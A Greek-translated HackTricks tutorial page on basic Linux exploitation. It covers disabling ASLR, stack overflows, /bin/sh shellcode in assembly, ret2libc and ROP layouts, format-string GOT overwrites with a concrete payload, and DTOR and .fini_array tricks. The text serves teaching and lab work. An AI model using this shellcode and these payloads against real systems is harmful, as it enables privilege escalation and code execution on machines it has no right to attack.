# Linux Exploiting (Βασικά) (SPA)

## Linux Exploiting (Βασικά) (SPA)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **ASLR**

Αλεατορισμός Διευθύνσεων Χώρου Εικονικής Μνήμης (ASLR)

**Απενεργοποίηση Παγκόσμιου Αλεατορισμού (ASLR) (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Επαναφορά Παγκόσμιου Αλεατορισμού: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Απενεργοποίηση για μια εκτέλεση** (δεν απαιτεί root):\
setarch \`arch\` -R ./παράδειγμα ορίσματα\
setarch \`uname -m\` -R ./παράδειγμα ορίσματα

**Απενεργοποίηση προστασίας εκτέλεσης στη στοίβα**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack παράδειγμα.c -o παράδειγμα

**Αρχείο πυρήνα**\
ulimit -c unlimited\
gdb /exec αρχείο\_πυρήνα\
/etc/security/limits.conf -> \* soft core unlimited

**Κείμενο**\
**Δεδομένα**\
**BSS**\
**Σωρός (Heap)**

**Στοίβα (Stack)**

**Τμήμα BSS**: Μη αρχικοποιημένες παγκόσμιες ή στατικές μεταβλητές
```
static int i;
```
**Ενότητα DATA**: Παγκόσμιες ή στατικές μεταβλητές που έχουν αρχικοποιηθεί
```
int i = 5;
```
**Ενότητα TEXT**: Οδηγίες του κώδικα (opcodes)

**Ενότητα HEAP**: Δυναμικά δεσμευμένοι προσωρινοί χώροι (malloc(), calloc(), realloc())

**Ενότητα STACK**: Ο σωρός (Παραμέτροι που περνιούνται, περιβαλλοντικές αλυσίδες (env), τοπικές μεταβλητές...)

## **1. ΥΠΕΡΧΕΙΡΙΣΜΟΣ ΣΤΟΙΒΑΣ (STACK OVERFLOWS)**

> Υπερχείλιση buffer, υπερχείλιση προσωρινού χώρου, υπερχείλιση στοίβας, καταστροφή στοίβας

Σφάλμα σεγματοποίησης ή παραβίασης σεγμέντου: Όταν προσπαθείτε να αποκτήσετε πρόσβαση σε μια διεύθυνση μνήμης που δεν έχει εκχωρηθεί στη διεργασία.

Για να λάβετε τη διεύθυνση μιας συνάρτησης μέσα σε ένα πρόγραμμα, μπορείτε να κάνετε:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Κλήση στο sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Παρακολούθηση διακοπών πυρήνα: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; εκκαθάριση του eax\
xor ebx, ebx ; ebx = 0 καθώς δεν υπάρχει όρισμα που να περάσει\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Εκτέλεση syscall

**nasm -f elf assembly.asm** —> Επιστρέφει ένα .o\
**ld assembly.o -o shellcodeout** —> Δίνει ένα εκτελέσιμο αρχείο που αποτελείται από τον αρχικό κώδικα συναρμολόγησης και μπορούμε να εξάγουμε τους opcodes με την εντολή **objdump**\
**objdump -d -Mintel ./shellcodeout** —> Για να δούμε ότι πράγματι είναι ο κώδικας μας και να εξάγουμε τους OpCodes

**Έλεγχος ότι ο κώδικας shell λειτουργεί**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Για να ελέγξετε αν οι κλήσεις συστήματος γίνονται σωστά, πρέπει να μεταγλωτίσετε το πρόγραμμα που προηγήθηκε και οι κλήσεις συστήματος πρέπει να εμφανίζονται στην εντολή **strace ./ΜΕΤΑΓΛΩΤΙΣΜΕΝΟ\_ΠΡΟΓΡΑΜΜΑ**

Όταν δημιουργείτε shellcodes, μπορείτε να χρησιμοποιήσετε ένα κόλπο. Η πρώτη εντολή είναι ένα άλμα σε ένα κάλεσμα. Το κάλεσμα καλεί τον αρχικό κώδικα και επίσης τοποθετεί το EIP στο stack. Μετά την εντολή κλήσης, έχουμε εισάγει το απαιτούμενο string, έτσι με αυτό το EIP μπορούμε να δείξουμε στο string και να συνεχίσουμε να εκτελούμε τον κώδικα.

Π.χ. **ΚΟΛΠΟΣ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Χρήση του Stack (/bin/sh):**

Η τεχνική αυτή εκμεταλλεύεται μια ευπάθεια στον κώδικα για να εκτελέσει κακόβουλο κώδικα και να αποκτήσει πρόσβαση σε ένα σύστημα Linux. Ακολουθήστε τα παρακάτω βήματα για να εκτελέσετε αυτήν την επίθεση:

1. Αναζητήστε μια ευπάθεια στον κώδικα που επιτρέπει την εκτέλεση κακόβουλου κώδικα.
2. Ανακαλύψτε τη διεύθυνση της στοίβας (stack address) στον σταθερό χώρο μνήμης.
3. Δημιουργήστε ένα πρόγραμμα C που θα εκτελέσει τον κακόβουλο κώδικα.
4. Χρησιμοποιήστε τη συνάρτηση `strcpy()` για να αντιγράψετε τον κακόβουλο κώδικα στη στοίβα.
5. Αλλάξτε τη διεύθυνση επιστροφής (return address) της στοίβας ώστε να δείχνει στον κακόβουλο κώδικα.
6. Εκτελέστε το πρόγραμμα C για να εκτελέσετε τον κακόβουλο κώδικα και να αποκτήσετε πρόσβαση στο σύστημα.

Αυτή η τεχνική είναι μια από τις βασικές μεθόδους εκμετάλλευσης σε συστήματα Linux και μπορεί να χρησιμοποιηθεί για να αποκτήσετε πρόσβαση διαχειριστή (root access) σε ένα σύστημα. Πρέπει να είστε προσεκτικοί κατά την εκτέλεση αυτής της επίθεσης, καθώς μπορεί να προκαλέσει προβλήματα στο σύστημα αν δεν γίνει σωστά.
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**ΕΝΤΟΛΗ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Κυνηγός Αυγών:**

Αυτό είναι ένα μικρό κομμάτι κώδικα που αναζητά τις σελίδες μνήμης που σχετίζονται με ένα διεργασία για να βρει τον κώδικα του κελύφους που είναι αποθηκευμένος εκεί (ψάχνει για κάποια υπογραφή που έχει τοποθετηθεί στον κώδικα του κελύφους). Χρήσιμο σε περιπτώσεις όπου υπάρχει μόνο ένα μικρό χώρο για να εισαχθεί κώδικας.

**Πολυμορφικοί κώδικες κελύφους**

Αυτοί είναι κρυπτογραφημένοι κώδικες κελύφους που περιέχουν ένα μικρό κομμάτι κώδικα που τους αποκρυπτογραφεί και πηδάει σε αυτόν, χρησιμοποιώντας το κόλπο του Call-Pop. Ένα παράδειγμα θα ήταν ένας κρυπτογραφημένος κώδικας κελύφους με κρυπτογράφηση Caesar:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **Επίθεση στο Frame Pointer (EBP)**

Χρήσιμη σε μια κατάσταση όπου μπορούμε να τροποποιήσουμε το EBP αλλά όχι το EIP.

Είναι γνωστό ότι κατά την έξοδο από μια συνάρτηση εκτελείται ο παρακάτω αρχικός κώδικας συναρμολογητή:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Με αυτόν τον τρόπο, μπορεί να τροποποιηθεί το EBP κατά την έξοδο από μια συνάρτηση (fvuln) που έχει κληθεί από μια άλλη συνάρτηση, όταν η συνάρτηση που κάλεσε την fvuln τελειώσει, το EIP της μπορεί να τροποποιηθεί.

Στην fvuln μπορεί να εισαχθεί ένα ψεύτικο EBP που να δείχνει σε ένα σημείο όπου βρίσκεται η διεύθυνση του shellcode + 4 (πρέπει να προστεθεί 4 για το pop). Έτσι, κατά την έξοδο από τη συνάρτηση, θα εισαχθεί στο ESP η τιμή του &(\&Shellcode)+4, με το pop θα αφαιρεθεί 4 από το ESP και αυτό θα δείχνει στη διεύθυνση του shellcode όταν εκτελεστεί το ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + γέμισμα + &(\&Shellcode)+4

**Off-by-One Exploit**\
Επιτρέπεται η τροποποίηση μόνο του λιγότερο σημαντικού byte του EBP. Μπορεί να πραγματοποιηθεί μια επίθεση όπως προηγουμένως, αλλά η μνήμη που αποθηκεύει τη διεύθυνση του shellcode πρέπει να μοιράζεται τα πρώτα 3 bytes με το EBP.

## **4. Μέθοδοι return to Libc**

Χρήσιμη μέθοδος όταν το stack δεν είναι εκτελέσιμο ή αφήνει ένα πολύ μικρό buffer για να γίνουν τροποποιήσεις.

Το ASLR προκαλεί τη φόρτωση των συναρτήσεων σε διαφορετικές θέσεις μνήμης κάθε φορά που εκτελείται. Επομένως, αυτή η μέθοδος μπορεί να μην είναι αποτελεσματική σε αυτήν την περίπτωση. Για απομακρυσμένους διακομιστές, καθώς το πρόγραμμα εκτελείται συνεχώς στην ίδια διεύθυνση, μπορεί να είναι χρήσιμη.

* **cdecl(C declaration)** Τοποθετεί τα ορίσματα στο stack και μετά την έξοδο από τη συνάρτηση καθαρίζει το stack
* **stdcall(standard call)** Τοποθετεί τα ορίσματα στο stack και η κληθείσα συνάρτηση το καθαρίζει
* **fastcall** Τοποθετεί τα δύο πρώτα ορίσματα σε καταχωρητές και τα υπόλοιπα στο stack

Τοποθετούμε τη διεύθυνση της εντολής system της libc και την περνάμε ως όρισμα το string "/bin/sh", συνήθως από μια μεταβλητή περιβάλλοντος. Επιπλέον, χρησιμοποιούμε τη διεύθυνση της συνάρτησης exit ώστε όταν δεν χρειάζεται πλέον η κέλυφος, το πρόγραμμα να τερματίσει χωρίς προβλήματα (και εγγραφή καταγραφής).

**export SHELL=/bin/sh**

Για να βρούμε τις απαιτούμενες διευθύνσεις, μπορούμε να κοιτάξουμε μέσα στο **GDB:**\
**p system**\
**p exit**\
**rabin2 -i εκτελέσιμο** —> Δίνει τη διεύθυνση όλων των συναρτήσεων που χρησιμοποιεί το πρόγραμμα κατά τη φόρτωση\
(Μέσα σε ένα start ή οποιοδήποτε breakpoint): **x/500s $esp** —> Αναζητούμε εδώ το string /bin/sh

Αφού έχουμε αυτές τις διευθύνσεις, το **exploit** θα είναι:

"A" \* ΑΠΟΣΤΑΣΗ EBP + 4 (EBP: μπορεί να είναι 4 "A" αλλά είναι καλύτερο να είναι το πραγματικό EBP για να αποφευχθούν σφάλματα segmentaion) + Διεύθυνση **system** (θα αντικαταστήσει το EIP) + Διεύθυνση **exit** (κατά την έξοδο από το system("/bin/sh") θα κληθεί αυτή η συνάρτηση, καθώς τα πρώτα 4 bytes του stack θεωρούνται η επόμενη διεύθυνση του EIP που θα εκτελεστεί) + Διεύθυνση "**/bin/sh**" (θα είναι το παράμετρος που περνάται στο system)

Με αυτόν τον τρόπο, το EIP θα αντικατασταθεί από τη διεύθυνση του system, το οποίο θα λάβει ως παράμετρο το string "/bin/sh
```
**Ret2PopRet**
```
Εάν δεν έχουμε έλεγχο επί του πρώτου ορίσματος, αλλά έχουμε έλεγχο επί του δεύτερου ή του τρίτου, μπορούμε να αντικαταστήσουμε το EIP με μια διεύθυνση pop-ret ή pop-pop-ret, ανάλογα με την ανάγκη μας.

**Η τεχνική του Murat**

Στο Linux, όλα τα προγράμματα αντιστοιχίζονται ξεκινώντας από το 0xbfffffff.

Δεδομένου ότι μπορούμε να δούμε πώς δημιουργείται η στοίβα ενός νέου διεργασίας στο Linux, μπορούμε να αναπτύξουμε ένα exploit έτσι ώστε το πρόγραμμα να εκτελείται σε ένα περιβάλλον όπου η μόνη μεταβλητή είναι ο κώδικας του κέλυφους. Η διεύθυνση αυτή μπορεί να υπολογιστεί ως εξής: addr = 0xbfffffff - 4 - strlen(ΟΝΟΜΑ_πλήρες_εκτελέσιμου_αρχείου) - strlen(κώδικας_κέλυφους)

Με αυτόν τον τρόπο, μπορούμε εύκολα να αποκτήσουμε τη διεύθυνση όπου βρίσκεται η μεταβλητή περιβάλλοντος με τον κώδικα του κέλυφους.

Αυτό είναι δυνατό χάρη στη συνάρτηση execle, η οποία επιτρέπει τη δημιουργία ενός περιβάλλοντος που περιέχει μόνο τις μεταβλητές περιβάλλοντος που επιθυμούμε.

**Μετάβαση στο ESP: Στυλ Windows**

Καθώς το ESP δείχνει πάντα στην αρχή της στοίβας, αυτή η τεχνική αποτελείται από την αντικατάσταση του EIP με τη διεύθυνση μιας κλήσης στο **jmp esp** ή **call esp**. Με αυτόν τον τρόπο, ο κώδικας του κέλυφους αποθηκεύεται μετά την αντικατάσταση του EIP, καθώς μετά την εκτέλεση της εντολής **ret**, το ESP θα δείχνει στην επόμενη διεύθυνση, ακριβώς εκεί όπου έχει αποθηκευτεί ο κώδικας του κέλυφους.

Στην περίπτωση που το ASLR δεν είναι ενεργοποιημένο στα Windows ή το Linux, μπορούμε να καλέσουμε το **jmp esp** ή **call esp** που αποθηκεύονται σε κάποιο κοινόχρηστο αντικείμενο. Εάν το ASLR είναι ενεργοποιημένο, μπορούμε να αναζητήσουμε μέσα στο ίδιο ευάλωτο πρόγραμμα.

Επιπλέον, το γεγονός ότι μπορούμε να τοποθετήσουμε τον κώδικα του κέλυφους μετά την καταστροφή του EIP αντί να τοποθετηθεί στη μέση της στοίβας, επιτρέπει στις εντολές push ή pop που εκτελούνται μέσα στη συνάρτηση να μην αγγίξουν τον κώδικα του κέλυφους (κάτι που θα μπορούσε να συμβεί αν τοποθετηθεί στη μέση της στοίβας της συνάρτησης).

Με πολύ παρόμοιο τρόπο, εάν γνωρίζουμε ότι μια συνάρτηση επιστρέφει τη διεύθυνση όπου αποθηκεύεται ο κώδικας του κέλυφους, μπορούμε να καλέσουμε το **call eax** ή **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) ή δανεισμένα τμήματα κώδικα**

Τα τμήματα κώδικα που καλούνται αποκαλούνται gadgets.

Αυτή η τεχνική αποτελείται από τη σύνδεση διαφόρων κλήσεων συναρτήσεων με την τεχνική του **ret2libc** και τη χρήση του **pop,ret**.

Σε ορισμένες αρχιτεκτονικές επεξεργαστών, κάθε εντολή αποτελεί ένα σύνολο 32 bits (π.χ. MIPS). Ωστόσο, στην Intel, οι εντολές έχουν μεταβλητό μέγεθος και πολλές εντολές μπορούν να μοιράζονται ένα σύνολο bits, για παράδειγμα:

**movl $0xe4ff, -0x(%ebp)** —> Περιέχει τα bytes 0xffe4 που μεταφράζονται επίσης ως: **jmp \*%esp**

Με αυτόν τον τρόπο, μπορούμε να εκτελέσουμε ορισμένες εντολές που δεν υπάρχουν πραγματικά στο αρχικό πρόγραμμα.

Το ROPgadget.py μας βοηθά να βρούμε τιμές σε δυαδικά αρχεία.

Αυτό το πρόγραμμα χρησιμοποιείται επίσης για τη δημιουργία των **payloads**. Μπορείτε να δώσετε τη βιβλιοθήκη από την οποία θέλετε να εξάγετε τα ROPs και θα δημιουργήσει ένα payload σε Python, στο οποίο θα δώσετε τη διεύθυνση στην οποία βρίσκεται η συγκεκριμένη βιβλιοθήκη και το payload είναι έτοιμο για χρήση ως κώδικας κέλυφους. Επιπλέον, καθώς χρησιμοποιεί κλήσεις συστήματος, δεν εκτελεί πραγματικά τίποτα στη στοίβα, αλλά απλά αποθηκεύει διευθύνσεις ROP που θα εκτελεστούν με την εντολή **ret**. Για να χρησιμοποιήσετε αυτό το payload, πρέπει να καλέσετε το payload με μια εντολή **ret**.

**Υπερχείλιση ακεραίων (Integer overflows)**

Αυτού του είδους οι υπερχειλίσεις συμβαίνουν όταν μια μεταβλητή δεν είναι έτοιμη να υποστηρίξει έναν τόσο μεγάλο αριθμό όσο αυτός που δίνεται, πιθανώς λόγω σύγχυσης μεταξύ μεταβλητών με και χωρίς πρόσημο, για παράδειγμα:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Στο παραπάνω παράδειγμα βλέπουμε ότι το πρόγραμμα αναμένει 2 παραμέτρους. Η πρώτη είναι το μήκος του επόμενου αλφαριθμητικού και η δεύτερη είναι το αλφαριθμητικό.

Εάν δώσουμε έναν αρνητικό αριθμό ως πρώτη παράμετρο, θα ελεγχθεί ότι len < 256 και θα περάσουμε αυτό το φίλτρο, επιπλέον το strlen(buffer) θα είναι μικρότερο από το l, καθώς το l είναι unsigned int και θα είναι πολύ μεγάλο.

Αυτού του είδους τα overflows δεν αποσκοπούν στο να γράψουν κάτι στη διεργασία του προγράμματος, αλλά στο να ξεπεράσουν κακώς σχεδιασμένα φίλτρα για να εκμεταλλευτούν άλλες ευπάθειες.

**Μη αρχικοποιημένες μεταβλητές**

Δεν γνωρίζουμε την τιμή που μπορεί να πάρει μια μη αρχικοποιημένη μεταβλητή και μπορεί να είναι ενδιαφέρον να την παρατηρήσουμε. Μπορεί να πάρει την τιμή που πήρε μια μεταβλητή από την προηγούμενη συνάρτηση και αυτή να ελέγχεται από τον επιτιθέμενο.

## **Συμβολοσειρές μορφοποίησης**

Στη γλώσσα C, η συνάρτηση **`printf`** χρησιμοποιείται για να **εκτυπώσει** ένα αλφαριθμητικό. Η **πρώτη παράμετρος** που αναμένει αυτή η συνάρτηση είναι το **κείμενο με τους μορφοποιητές**. Οι **επόμενες παράμετροι** που αναμένονται είναι οι **τιμές** που θα **αντικαταστήσουν** τους **μορφοποιητές** στο κείμενο.

Η ευπάθεια εμφανίζεται όταν ένας **επιτιθέμενος τοποθετεί ένα κείμενο ως πρώτη παράμετρο** σε αυτήν τη συνάρτηση. Ο επιτιθέμενος θα μπορεί να δημιουργήσει μια **ειδική είσοδο καταχρώντας** τις **δυνατότητες μορφοποίησης** της printf για να **γράψει οποιαδήποτε δεδομένα σε οποιαδήποτε διεύθυνση**. Με αυτόν τον τρόπο μπορεί να **εκτελέσει αυθαίρετο κώδικα**.
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** **εγγράφει** τον **αριθμό των γραμμένων bytes** στην **καθορισμένη διεύθυνση. Εγγράφοντας** όσα **bytes** χρειάζεται να γράψουμε σε μορφή δεκαεξαδικού αριθμού, μπορούμε να **γράψουμε οποιαδήποτε δεδομένα**.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Πίνακας Παγκόσμιων Μετατοπίσεων) / PLT (Πίνακας Συνδέσεων Διαδικασίας)

Αυτός είναι ο πίνακας που περιέχει τη **διεύθυνση** των **εξωτερικών συναρτήσεων** που χρησιμοποιούνται από το πρόγραμμα.

Πάρτε τη διεύθυνση αυτού του πίνακα με: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Παρατηρήστε πώς μετά το **φόρτωμα** του **εκτελέσιμου** στο GEF μπορείτε να **δείτε** τις **συναρτήσεις** που βρίσκονται στον **GOT**: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Χρησιμοποιώντας το GEF μπορείτε να **ξεκινήσετε** μια συνεδρία **αποσφαλμάτωσης** και να εκτελέσετε **`got`** για να δείτε τον πίνακα got:

![](<../../.gitbook/assets/image (621).png>)

Σε ένα δυαδικό αρχείο, ο GOT έχει τις **διευθύνσεις των συναρτήσεων ή** του τμήματος **PLT** που θα φορτώσει τη διεύθυνση της συνάρτησης. Ο στόχος αυτής της εκμετάλλευσης είναι να **αντικαταστήσετε την καταχώρηση GOT** μιας συνάρτησης που θα εκτελεστεί αργότερα **με** τη **διεύθυνση** του PLT της συνάρτησης **`system`**. Ιδανικά, θα **αντικαταστήσετε** τον **GOT** μιας **συνάρτησης** που **θα κληθεί με παραμέτρους που ελέγχετε εσείς** (ώστε να μπορείτε να ελέγξετε τις παραμέτρους που αποστέλλονται στη συνάρτηση συστήματος).

Αν η συνάρτηση **`system`** **δεν χρησιμοποιείται** από το σενάριο, η συνάρτηση συστήματος **δεν θα** έχει μια καταχώρηση στο GOT. Σε αυτό το σενάριο, θα **χρειαστεί να διαρρεύσετε πρώτα τη διεύθυνση** της συνάρτησης `system`.

Ο **Πίνακας Συνδέσεων Διαδικασίας** είναι ένας **πίνακας μόνο για ανάγνωση** στο αρχείο ELF που αποθηκεύει όλα τα απαραίτητα **σύμβολα που χρειάζονται ανάλυση**. Όταν καλείται μία από αυτές τις συναρτήσεις, ο GOT θα **ανακατευθύνει** τη **ροή** στον PLT ώστε να **αναλύσει** τη **διεύθυνση** της συνάρτησης και να τη γράψει στο GOT.\
Στη συνέχεια, την **επόμενη φορά** που γίνεται μια κλήση σε αυτήν τη διεύθυνση, η συνάρτηση **καλείται απευθείας** χωρίς να χρειάζεται να αναλυθεί ξανά.

Μπορείτε να δείτε τις διευθύνσεις του PLT με **`objdump -j .plt -d ./vuln_binary`**

### **Ροή Εκμετάλλευσης**

Όπως εξηγήθηκε προηγουμένως, ο στόχος θα είναι να **αντικαταστήσετε** τη **διεύθυνση** μιας **συνάρτησης** στον πίνακα GOT που θα κληθεί αργότερα. Ιδανικά, θα μπορούσατε να ορίσετε τη **διεύθυνση σε ένα shellcode** που βρίσκεται σε ένα εκτελέσιμο τμήμα, αλλά πιθανότατα δεν θα μπορείτε να γράψετε ένα shellcode σε ένα εκτελέσιμο τμήμα.\
Έτσι, μια διαφορετική επιλογή είναι να **αντικαταστήσετε** μια **συνάρτηση** που **λαμβάνει** τις **παραμέτρους της** από τον **χρήστη** και να την κατευθύνετε στη **συνάρτηση `system`**.

Για να γράψετε τη διεύθυνση, συνήθως γίνονται 2 βήματα: Πρώτα γράφετε **2Bytes** της διεύθυνσης και στη συνέχεια τα άλλα 2. Για να το κάνετε αυτό χρησιμοποιείται το **`$hn`**.

Το **HOB** αναφέρεται στα 2 υψηλότερα bytes της διεύθυνσης\
Το **LOB** αναφέρεται στα 2 χαμηλότερα bytes της διεύθυνσης

Έτσι, λόγω του τρόπου λειτουργίας του format string, πρέπει να **γράψετε πρώτα το μικρότερο** από τα \[HOB, LOB] και στη συνέχεια το άλλο.

Αν HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Αν HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Πρότυπο Εκμετάλλευσης Format String**

Μπορείτε να βρείτε ένα **πρότυπο** για την εκμετάλλευση του GOT χρησιμοποιώντας format-strings εδώ:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Ουσιαστικά αυτή είναι μια δομή μ
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Σημείωση ότι αυτό **δεν θα δημιουργήσει** έναν **ατέρμονο βρόχο** επειδή όταν επιστρέψετε στο κύριο πρόγραμμα, το canary θα το παρατηρήσει, το τέλος της στοίβας μπορεί να έχει καταστραφεί και η συνάρτηση δεν θα κληθεί ξανά. Έτσι, με αυτό μπορείτε να **έχετε 1 ακόμα εκτέλεση** του ευπάθειας.

### **Μορφοποίηση Συμβολοσειρών για Εκτύπωση Περιεχομένου**

Μια συμβολοσειρά μορφοποίησης μπορεί επίσης να καταχραστεί για να **εκτυπώσει περιεχόμενο** από τη μνήμη του προγράμματος.\
Για παράδειγμα, στην παρακάτω κατάσταση υπάρχει μια **τοπική μεταβλητή στη στοίβα που δείχνει σε ένα σημαία.** Αν **βρείτε** πού στη **μνήμη** βρίσκεται ο **δείκτης** προς τη **σημαία**, μπορείτε να κάνετε τη **printf να έχει πρόσβαση** σε αυτήν τη **διεύθυνση** και να **εκτυπώσει** τη **σημαία**:

Έτσι, η σημαία βρίσκεται στη **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Και από τη διαρροή μπορείτε να δείτε ότι ο **δείκτης προς τη σημαία** βρίσκεται στη **8η** παράμετρο:

![](<../../.gitbook/assets/image (623).png>)

Έτσι, **έχοντας πρόσβαση** στη **8η παράμετρο** μπορείτε να πάρετε τη σημαία:

![](<../../.gitbook/assets/image (624).png>)

Σημειώστε ότι ακολουθώντας την **προηγούμενη εκμετάλλευση** και ανακαλύπτοντας ότι μπορείτε να **διαρρεύσετε περιεχόμενο** μπορείτε να **ορίσετε δείκτες** στο **`printf`** στην ενότητα όπου το **εκτελέσιμο** φορτώνεται και να το **εκτυπώσετε** **ολόκληρο**!

### **DTOR**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να βρείτε ένα δυαδικό με μια ενότητα dtor**.
{% endhint %}

Οι καταστροφείς είναι συναρτήσεις που **εκτελούνται πριν το πρόγραμμα τελειώσει**.\
Αν καταφέρετε να **γράψετε** μια **διεύθυνση** σε ένα **shellcode** στο **`__DTOR_END__`**, αυτό θα εκτελεστεί πριν το πρόγραμμα τελειώσει.\
Πάρτε τη διεύθυνση αυτής της ενότητας με:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Συνήθως θα βρείτε την ενότητα **DTOR** **μεταξύ** των τιμών `ffffffff` και `00000000`. Έτσι, αν απλά βλέπετε αυτές τις τιμές, σημαίνει ότι **δεν υπάρχει καμία εγγεγραμμένη συνάρτηση**. Έτσι, **αντικαταστήστε** το **`00000000`** με τη **διεύθυνση** του **shellcode** για να το εκτελέσετε.

### **Συμβολοσειρές μορφοποίησης για πλημμύρες buffer**

